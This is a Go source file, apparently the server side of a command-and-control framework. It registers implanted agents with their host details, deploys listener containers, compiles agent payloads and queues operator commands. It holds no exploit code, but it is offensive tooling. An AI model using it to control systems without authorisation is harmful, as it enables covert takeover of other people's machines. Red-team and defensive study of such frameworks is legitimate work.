package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"crypto/x509"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/go-sql-driver/mysql"
	"github.com/joho/godotenv"
	"github.com/redis/go-redis/v9"
)

// Initialize connections upon starting web app
var DB *sql.DB
var Ctx = context.Background()
var R *redis.Client

var listenerStore = struct {
	sync.RWMutex
	data []ActiveListener
}{
	data: make([]ActiveListener, 0),
}

type AdminPayload struct {
	UUID    string `json:"uuid"`
	Command string `json:"command"`
}

type RegisterRequest struct {
	// UUID     string `json:"uuid" binding:"required"`
	User     string `json:"user"`
	CID      string `json:"compile_id" binding:"required"`
	Profile  string `json:"profile"`
	Hostname string `json:"hostname"`
	Process  string `json:"process"`
	PID	     string `json:"pid"`
	IP       string `json:"ip"`
	Arch	 string `json:"arch"`
}

type ListenerConfig struct {
	Protocols   []string `json:"protocols"`
	DefaultPort int      `json:"default_port"`
	Description string   `json:"description"`
}

type ListenerTemplate struct {
	Name        string   `json:"name"`
	Protocols   []string `json:"protocols"`
	DefaultPort int      `json:"defaultPort"`
	Description string   `json:"description"`
}

type ActiveListener struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Protocol    string `json:"protocol"`
	Port        int    `json:"port"`
	Status      string `json:"status"`
	Description string `json:"description"`
	Template    string `json:"template"`
	Container   string `json:"container"`
}

type AgentConfig struct {
	PROFILE_ID			   string   `json:"profile_id"`
	OS                 []string `json:"os"`
	Languages          []string `json:"languages"`
	Commands           []string `json:"commands"`
	RequiredCommands   []string `json:"required_commands"`
	CommandDescriptions map[string]string `json:"command_descriptions,omitempty"`
	CommandUsage        map[string]string `json:"command_usage,omitempty"`
	PayloadOutput      []string `json:"payload_output"`
	Architectures      []string `json:"architectures"`
	SupportedListeners []string `json:"supported_listeners"`
	SupportedWrappers  map[string]WrapperProjectConfig `json:"supported_wrappers"`
}

type WrapperProjectConfig struct {
	SupportedModules map[string]WrapperModuleConfig `json:"supported_modules"`
}

type WrapperModuleConfig struct {
	RequiredFields []string               `json:"required_fields,omitempty"`
	Required map[string]interface{} `json:"required"`
	Optional []string `json:"optional"`
}

type CommandsConfig struct {
	Commands         []string          `json:"commands"`
	RequiredCommands []string          `json:"required_commands"`
	Description      map[string]string `json:"description"`
	Usage            map[string]string `json:"usage"`
}

type AgentProfile struct {
	Name        string      `json:"name"`
	ProjectRoot string      `json:"projectRoot"`
	ConfigPath  string      `json:"configPath"`
	Config      AgentConfig `json:"config"`
}

type AgentProfilesResponse struct {
	Profiles []AgentProfile `json:"profiles"`
	Warnings []string       `json:"warnings,omitempty"`
}

type CompileConfig struct {
	CompileID		 string   `json:"compileId"`
	AgentProfile string `json:"agentProfile"`
	Architecture string `json:"architecture"`
	OS		     string `json:"os"`
	Language     string `json:"language"`
	Wrapper      string `json:"wrapper"`
	Commands    []string `json:"commands"`
	RequiredCommands []string `json:"requiredCommands"`
	Listener     string `json:"listener"`
	Host         string `json:"host"`
	Port         string `json:"port"`
	UseAES	  int    `json:"useAES"`
	OutputType    string `json:"outputType"`
	OutputFileName string `json:"outputFileName"`
	WrapperArgs string `json:"wrapperArgs"`
}

type CompileResult struct {
	CompileID   string `json:"uuid"`
	Status string `json:"status"`
	Logs   string `json:"logs"`
}

func init() {
	var err error
	err = godotenv.Load("/app/.env")
	if err != nil {
		log.Println("Error loading .env file")
	}
	var db_user = os.Getenv("DB_USER")
	var db_pass = os.Getenv("DB_PASS")
	var database = os.Getenv("DATABASE")
	var docker_db = os.Getenv("DOCKER_DB")
	var redis_host = os.Getenv("REDIS_HOST")
	var redis_pass = os.Getenv("REDIS_PASS")
	var db_host string
	if strings.EqualFold(docker_db, "false") {
		db_host = os.Getenv("DB_HOST")
	} else {
		db_host = "mariadb"
	}

	// Create SQL ssl stuff
	caCert, err := os.ReadFile("certs/ca.crt")
	if err != nil {
		log.Println(err)
	}
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)

	clientCert, err := tls.LoadX509KeyPair("certs/client.crt", "certs/client.key")
	if err != nil {
		log.Println(err)
	}

	tlsConfig := &tls.Config{
		RootCAs:      certPool,
		Certificates: []tls.Certificate{clientCert},
	}

	err = mysql.RegisterTLSConfig("custom", tlsConfig)
	if err != nil {
		log.Println(err)
	}

	// Create database connection
	dsn := fmt.Sprintf("%v:%v@tcp(%v:3306)/%v?parseTime=true&tls=custom", db_user, db_pass, db_host, database)

	DB, err = sql.Open("mysql", dsn)
	if err != nil {
		log.Println("Failed to connect to database:", err)
	}
	// configure connection pool
	DB.SetMaxOpenConns(20)
	DB.SetMaxIdleConns(10)
	DB.SetConnMaxLifetime(time.Minute * 30)

	// Ping to test connection
	if err := DB.Ping(); err != nil {
		log.Println("Database ping failed:", err)
		return
	}

	// Create redis connection
	Ctx = context.Background()
	R = redis.NewClient(&redis.Options{
		Addr:     redis_host + ":6379",
		DB:       0,
		Username: "default",
		Password: redis_pass,
	})

	if _, err := R.Ping(Ctx).Result(); err != nil {
		log.Println("Redis client failed to connect:", err)
		R = nil
	}
}

func listenersBaseDir() string {
	base := os.Getenv("LISTENERS_DIR")
	if base == "" {
		base = "/app/listeners"
	}
	return base
}

func readListenerConfig(dir string) (*ListenerConfig, error) {
	data, err := os.ReadFile(filepath.Join(dir, "config.json"))
	if err != nil {
		return nil, err
	}
	var cfg ListenerConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func listListenerTemplates() ([]ListenerTemplate, error) {
	base := listenersBaseDir()
	entries, err := os.ReadDir(base)
	if err != nil {
		return nil, err
	}

	items := make([]ListenerTemplate, 0)
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		cfg, err := readListenerConfig(filepath.Join(base, name))
		if err != nil {
			log.Println(err)
			continue
		}
		items = append(items, ListenerTemplate{
			Name:        name,
			Protocols:   cfg.Protocols,
			DefaultPort: cfg.DefaultPort,
			Description: cfg.Description,
		})
	}

	return items, nil
}

func listActiveListeners() []ActiveListener {
	listenerStore.RLock()
	defer listenerStore.RUnlock()
	items := make([]ActiveListener, len(listenerStore.data))
	copy(items, listenerStore.data)
	return items
}

func sanitizeListenerName(name string) (string, error) {
	cleaned := strings.Builder{}
	lastDash := false
	for _, r := range strings.ToLower(strings.TrimSpace(name)) {
		switch {
		case r >= 'a' && r <= 'z':
			cleaned.WriteRune(r)
			lastDash = false
		case r >= '0' && r <= '9':
			cleaned.WriteRune(r)
			lastDash = false
		case r == '-' || r == '_' || r == '.' || r == ' ':
			if cleaned.Len() > 0 && !lastDash {
				cleaned.WriteByte('-')
				lastDash = true
			}
		}
	}
	value := strings.Trim(cleaned.String(), "-")
	if value == "" {
		return "", errors.New("listener name must contain letters or numbers")
	}
	return value, nil
}

func deployListener(displayName string, templateName string, protocol string, port int) (*ActiveListener, error) {
	if strings.TrimSpace(templateName) == "" {
		templateName = displayName
	}
	if strings.TrimSpace(templateName) == "" {
		return nil, errors.New("listener template is required")
	}
	if strings.TrimSpace(protocol) == "" {
		return nil, errors.New("protocol is required")
	}
	if strings.TrimSpace(displayName) == "" {
		displayName = templateName
	}
	safeName, err := sanitizeListenerName(displayName)
	if err != nil {
		return nil, err
	}
	base := listenersBaseDir()
	listenerDir := filepath.Join(base, templateName)
	if _, err := os.Stat(listenerDir); err != nil {
		return nil, errors.New("listener template not found")
	}
	config, err := readListenerConfig(listenerDir)
	if err != nil {
		return nil, err
	}
	allowed := false
	for _, p := range config.Protocols {
		if strings.EqualFold(p, protocol) {
			allowed = true
			protocol = p
			break
		}
	}
	if !allowed {
		return nil, errors.New("protocol not supported by listener")
	}
	if port <= 0 {
		port = config.DefaultPort
	}

	imageTag := fmt.Sprintf("ygg-listener-%s", templateName)
	buildCmd := exec.Command("docker", "build", "-t", imageTag, listenerDir)
	if out, err := buildCmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("docker build failed: %s", strings.TrimSpace(string(out)))
	}

	containerName := fmt.Sprintf("ygg-listener-%s", safeName)
	var portMap string
	if os.Getenv("LOCAL_PROXY") == "1" {
		portMap = fmt.Sprintf("%d", port)
	} else {
		portMap = fmt.Sprintf("%d:%d", port, config.DefaultPort)
	}

	listenerStore.RLock()
	for _, item := range listenerStore.data {
		if item.Container == containerName {
			listenerStore.RUnlock()
			return nil, errors.New("listener name is already in use")
		}
	}
	listenerStore.RUnlock()

	var runCmd *exec.Cmd
	runCmd = exec.Command(
		"docker", "run", "-d",
		"--name", containerName,
		"--label", "ygg.listener=true",
		"--label", "ygg.listener.name="+displayName,
		"--label", "ygg.listener.template="+templateName,
		"--label", "ygg.listener.protocol="+protocol,
		"--network", "handlers_yggdrasil",
		"-p", portMap,
		imageTag,
	)

	if out, err := runCmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("docker run failed: %s", strings.TrimSpace(string(out)))
	}

	item := ActiveListener{
		ID:          fmt.Sprintf("%s-%d", safeName, time.Now().UnixNano()),
		Name:        displayName,
		Protocol:    protocol,
		Port:        port,
		Status:      "RUNNING",
		Description: config.Description,
		Template:    templateName,
		Container:   containerName,
	}

	listenerStore.Lock()
	listenerStore.data = append(listenerStore.data, item)
	listenerStore.Unlock()

	if R != nil {
		R.Publish(Ctx, "listener_update", strconv.FormatInt(time.Now().UnixNano(), 10))
	}

	return &item, nil
}

func removeListener(id string) error {
	if strings.TrimSpace(id) == "" {
		return errors.New("listener id is required")
	}
	listenerStore.Lock()
	defer listenerStore.Unlock()

	index := -1
	var containerName string
	for i, item := range listenerStore.data {
		if item.ID == id {
			index = i
			containerName = item.Container
			break
		}
	}
	if index == -1 {
		return errors.New("listener not found")
	}
	if strings.TrimSpace(containerName) != "" {
		cmd := exec.Command("docker", "rm", "-f", containerName)
		if out, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("docker rm failed: %s", strings.TrimSpace(string(out)))
		}
	}

	listenerStore.data = append(listenerStore.data[:index], listenerStore.data[index+1:]...)
	if R != nil {
		R.Publish(Ctx, "listener_update", strconv.FormatInt(time.Now().UnixNano(), 10))
	}
	return nil
}

func get_data(rows *sql.Rows) [][]string {
	var results [][]string

	cols, err := rows.Columns() // get column names dynamically
	if err != nil {
		log.Println(err)
		return results
	}

	for rows.Next() {
		// Make a slice of interfaces to hold column values
		columns := make([]interface{}, len(cols))
		columnPointers := make([]interface{}, len(cols))
		for i := range columns {
			columnPointers[i] = &columns[i]
		}

		// Scan the row into columnPointers
		if err := rows.Scan(columnPointers...); err != nil {
			log.Println(err)
			continue
		}

		// Convert []interface{} to []string
		rowData := make([]string, len(cols))
		for i, col := range columns {
			if col != nil {
				rowData[i] = string(col.([]byte)) // DB returns []byte for string columns
			} else {
				rowData[i] = ""
			}
		}

		results = append(results, rowData)
	}
	// Returns a 2D array of rows and columns accessed by results[row][column]
	return results
}

func register_agent(data *RegisterRequest) (string, [][]string) {
	uuid, err := createUUID()
	if err != nil {
		log.Println(err)
		return "", nil
	}

	R.RPush(Ctx, uuid, "AGENT REGISTERED")
	R.Publish(Ctx, "new_agent", fmt.Sprintf("%v --> %v", data.User, data.IP))
	checkin := time.Now().UTC()

	// modify later to take sleep int from agent
	_, err = DB.Exec(`INSERT INTO agents
						(uuid, name, status, first_seen, last_seen, sleep, profile, ip, process, pid, arch, hostname, user, compile_id)
					VALUES 
						(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, uuid, uuid, "ALIVE", checkin, checkin, 5, data.Profile, data.IP, data.Process, data.PID, data.Arch, data.Hostname, data.User, data.CID)
	if err != nil {
		log.Println(err)
	}

	// select from agents and payloads
	rows, err := DB.Query(`SELECT private, public FROM payloads WHERE compile_id = ?`, data.CID)
	if err != nil {
		log.Println(err)
	}
	defer rows.Close()
	return uuid, get_data(rows)
}

func get_keys(uuid string) [][]string {
	rows, err := DB.Query("SELECT T2.private, T2.public FROM agents AS T1 JOIN payloads AS T2 ON T1.compile_id = T2.compile_id WHERE T1.uuid = ? AND T2.use_aes = 1;", uuid)
	if err != nil {
		log.Println(err)
	}
	defer rows.Close()
	return get_data(rows)
}

func update_seen(uuid string) {
	checkin := time.Now().UTC()
	_, err := DB.Exec("UPDATE agents SET last_seen = ?, status = 'ALIVE' WHERE uuid = ?", checkin, uuid)
	if err != nil {
		log.Println(err)
	}
	if R != nil {
		R.Publish(Ctx, "agent_update", uuid)
	}
}

func startAliveMonitor() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		if DB == nil {
			continue
		}
		now := time.Now().UTC()
		_, err := DB.Exec("UPDATE agents SET status = 'DEAD' WHERE status = 'ALIVE' AND TIMESTAMPADD(SECOND, sleep * 4, last_seen) < ?", now)
		if err != nil {
			log.Println(err)
		}
		if R != nil {
			R.Publish(Ctx, "agent_update", "tick")
		}
	}
}

func small_check(uuid string) {
	cmd, err := R.LIndex(Ctx, uuid, -2).Result()
	if err != nil {
		log.Println(err)
	}
	raw_cmd := strings.SplitN(cmd, " ", 2)
	switch raw_cmd[0] {
	case "exit":
		R.Del(Ctx, uuid)
		DB.Exec("DELETE FROM agents WHERE uuid = ?", uuid)
	case "sleep":
		DB.Exec("UPDATE agents SET sleep = ? WHERE uuid = ?", raw_cmd[1], uuid)
	}
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padtext...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, errors.New("invalid padding size")
	}

	padding := int(data[length-1])
	if padding > length {
		return nil, errors.New("invalid padding")
	}

	for _, v := range data[length-padding:] {
		if int(v) != padding {
			return nil, errors.New("invalid padding")
		}
	}

	return data[:length-padding], nil
}

func aes_encrypt(plaintext []byte, keyHex, ivHex string) (string, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return "", err
	}

	iv, err := hex.DecodeString(ivHex)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	plaintext = pkcs7Pad(plaintext, block.BlockSize())

	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func aes_decrypt(enc, keyHex, ivHex string) (string, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return "", err
	}

	iv, err := hex.DecodeString(ivHex)
	if err != nil {
		return "", err
	}

	ciphertext, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	if len(ciphertext)%block.BlockSize() != 0 {
		return "", errors.New("ciphertext is not a multiple of block size")
	}

	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(plaintext, ciphertext)

	unpadded, err := pkcs7Unpad(plaintext)
	if err != nil {
		return "", err
	}

	return string(unpadded), nil
}

func listAgentProfiles() (AgentProfilesResponse, error) {
	base := "/app/Agent_Profiles"

	entries, err := os.ReadDir(base)
	if err != nil {
		return AgentProfilesResponse{}, err
	}

	response := AgentProfilesResponse{
		Profiles: make([]AgentProfile, 0),
		Warnings: make([]string, 0),
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		name := entry.Name()
		projectRoot := filepath.Join(base, name)
		configPath := filepath.Join(projectRoot, "config.json")

		cfg, err := readAgentConfig(projectRoot)
		if err != nil {
			response.Warnings = append(response.Warnings, fmt.Sprintf("skipped %s: %s", name, err))
			continue
		}

		response.Profiles = append(response.Profiles, AgentProfile{
			Name:        name,
			ProjectRoot: projectRoot,
			ConfigPath:  configPath,
			Config:      *cfg,
		})
	}

	return response, nil
}


func readAgentConfig(projectRoot string) (*AgentConfig, error) {
	configPath := filepath.Join(projectRoot, "config.json")
	commandsPath := filepath.Join(projectRoot, "commands.json")

	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}

	var cfg AgentConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}

	if cfg.SupportedWrappers == nil {
		cfg.SupportedWrappers = map[string]WrapperProjectConfig{}
	}

	for projectName, projectConfig := range cfg.SupportedWrappers {
		if projectConfig.SupportedModules == nil {
			projectConfig.SupportedModules = map[string]WrapperModuleConfig{}
		}

		for moduleName, moduleConfig := range projectConfig.SupportedModules {
			requiredFields := make([]string, 0)
			if rawFields, ok := moduleConfig.Required["fields"]; ok {
				requiredFields = append(requiredFields, asStringSlice(rawFields)...)
				delete(moduleConfig.Required, "fields")
			}
			moduleConfig.RequiredFields = uniqueStrings(requiredFields)
			moduleConfig.Optional = uniqueStrings(moduleConfig.Optional)
			projectConfig.SupportedModules[moduleName] = moduleConfig
		}

		cfg.SupportedWrappers[projectName] = projectConfig
	}

	commandsData, err := os.ReadFile(commandsPath)
	if err == nil {
		var commandCfg CommandsConfig
		if err := json.Unmarshal(commandsData, &commandCfg); err != nil {
			return nil, fmt.Errorf("failed to parse commands.json: %w", err)
		}
		cfg.Commands = commandCfg.Commands
		cfg.RequiredCommands = commandCfg.RequiredCommands
		cfg.CommandDescriptions = commandCfg.Description
		cfg.CommandUsage = commandCfg.Usage
	} else if !os.IsNotExist(err) {
		return nil, fmt.Errorf("failed to read commands.json: %w", err)
	}

	return &cfg, nil
}

func asStringSlice(value interface{}) []string {
	items, ok := value.([]interface{})
	if !ok {
		return nil
	}

	result := make([]string, 0, len(items))
	for _, item := range items {
		if text, ok := item.(string); ok && strings.TrimSpace(text) != "" {
			result = append(result, strings.TrimSpace(text))
		}
	}

	return result
}

func uniqueStrings(values []string) []string {
	seen := make(map[string]struct{}, len(values))
	result := make([]string, 0, len(values))

	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed == "" {
			continue
		}
		if _, exists := seen[trimmed]; exists {
			continue
		}
		seen[trimmed] = struct{}{}
		result = append(result, trimmed)
	}

	return result
}

func compileAgent(conf *CompileConfig) (*CompileResult, string, error) {
	safeName, err := sanitizeListenerName(strings.ToLower(conf.AgentProfile))
	if err != nil {
		return nil, "", err
	}

	agentDir := filepath.Join("/app/Agent_Profiles", conf.AgentProfile)
	dockerfilePath := filepath.Join(agentDir, "compiler", "Dockerfile")

	imageTag := fmt.Sprintf("ygg-compiler-%s", safeName)
	containerName := fmt.Sprintf("ygg-compiler-%s", safeName)

	compile_id, err := createUUID()
	if err != nil {
		return nil, "", err
	}

	buildCmd := exec.Command(
		"docker", "build",
		"--build-arg", "PROFILE="+conf.AgentProfile,
		"-t", imageTag,
		"-f", dockerfilePath,
		agentDir,
	)

	if out, err := buildCmd.CombinedOutput(); err != nil {
		logs := strings.TrimSpace(string(out))
		return nil, logs, fmt.Errorf("docker build failed: %s", logs)
	}

	compiled_payloads := os.Getenv("COMPILED_PAYLOADS")
	wrappers := os.Getenv("WRAPPERS_DIR")

	var runCmd *exec.Cmd
	runCmd = exec.Command(
		"docker", "run", "--rm",
		"--name", containerName,
		"--label", "ygg.compiler=true",
		"--label", "ygg.compiler.profile="+conf.AgentProfile,
		"-v", compiled_payloads,
		"-v", wrappers,

		"-e", "AGENT_PROFILE=" + conf.AgentProfile,
		"-e", "COMPILE_ID=" + compile_id,
		"-e", "ARCH="+conf.Architecture,
		"-e", "OS="+conf.OS,
		"-e", "LANGUAGE="+conf.Language,
		"-e", "WRAPPER="+conf.Wrapper,
		"-e", "LISTENER="+conf.Listener,
		"-e", "HOST="+strings.TrimSpace(conf.Host),
		"-e", "PORT="+strings.TrimSpace(conf.Port),
		"-e", "USEAES="+strconv.Itoa(conf.UseAES),
		"-e", "OUTPUT_TYPE="+conf.OutputType,
		"-e", "OUTPUT_FILE_NAME="+conf.OutputFileName,
		"-e", "COMMANDS="+strings.Join(conf.Commands, ","),
		"-e", "REQUIRED_COMMANDS="+strings.Join(conf.RequiredCommands, ","),
		"-e", "WRAPPER_ARGS="+conf.WrapperArgs,

		imageTag,
		"/app/Agent_Profiles/"+conf.AgentProfile+"/compiler/build",
	)

	out, err := runCmd.CombinedOutput()
	logs := strings.TrimSpace(string(out))
	if err != nil {
		return nil, logs, fmt.Errorf("docker run failed: %s", logs)
	}

	if R != nil {
		_ = R.Publish(Ctx, "agent_compiled", strconv.FormatInt(time.Now().UnixNano(), 10)).Err()
	}

	return &CompileResult{
		CompileID: compile_id,
		Status: "compiled",
		Logs:   logs,
	}, logs, nil
}

func createUUID () (string, error) {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		return "", err
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:]), nil
}

func recordPayload(conf *CompileConfig, compile_id string) error {
	keyHex := ""
	ivHex := ""

	if conf.UseAES == 1 {
		key := make([]byte, 32)
		if _, err := rand.Read(key); err != nil {
			return err
		}

		iv := make([]byte, aes.BlockSize)
		if _, err := rand.Read(iv); err != nil {
			return err
		}

		keyHex = hex.EncodeToString(key)
		ivHex = hex.EncodeToString(iv)
	}

	created := time.Now().UTC()
	_, err := DB.Exec(`INSERT INTO payloads
						(compile_id, name, profile, created, use_aes, arch, os, listener, private, public) 
					VALUES
						(?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, compile_id, conf.OutputFileName, conf.AgentProfile, created, conf.UseAES, conf.Architecture, conf.OS, conf.Listener, keyHex, ivHex)
	if err != nil {
		log.Println(err)
	}

	return nil
}

func historyTimestamp(now time.Time) string {
	return now.Local().Format("2006-01-02 15:04:05")
}

func getLastIssuedCommand(uuid string) string {
	if R == nil || strings.TrimSpace(uuid) == "" {
		return ""
	}
	command, err := R.LIndex(Ctx, uuid, -2).Result()
	if err != nil {
		return ""
	}
	trimmed := strings.TrimSpace(command)
	if trimmed == "" || trimmed == "SEEN" || trimmed == "AGENT REGISTERED" {
		return ""
	}
	return trimmed
}

func appendAgentHistory(uuid string, command string, output string) {
	if R == nil || strings.TrimSpace(uuid) == "" {
		return
	}

	historyKey := uuid + "-history"
	timestamp := historyTimestamp(time.Now())
	entries := make([]string, 0, 1)

	if trimmedCommand := strings.TrimSpace(command); trimmedCommand != "" {
		entries = append(entries, fmt.Sprintf("[%s] $ %s", timestamp, trimmedCommand))
	}

	if trimmedOutput := strings.TrimRight(output, "\n"); trimmedOutput != "" {
		for _, line := range strings.Split(strings.ReplaceAll(trimmedOutput, "\r\n", "\n"), "\n") {
			entries = append(entries, fmt.Sprintf("[%s] %s", timestamp, line))
		}
	} else if len(entries) > 0 {
		entries = append(entries, fmt.Sprintf("[%s] (no output)", timestamp))
	}

	if len(entries) == 0 {
		return
	}

	if err := R.RPush(Ctx, historyKey, entries).Err(); err != nil {
		log.Println("failed to rpush agent history:", err)
		return
	}
	if err := R.LTrim(Ctx, historyKey, -200, -1).Err(); err != nil {
		log.Println("failed to ltrim agent history list:", err)
	}
}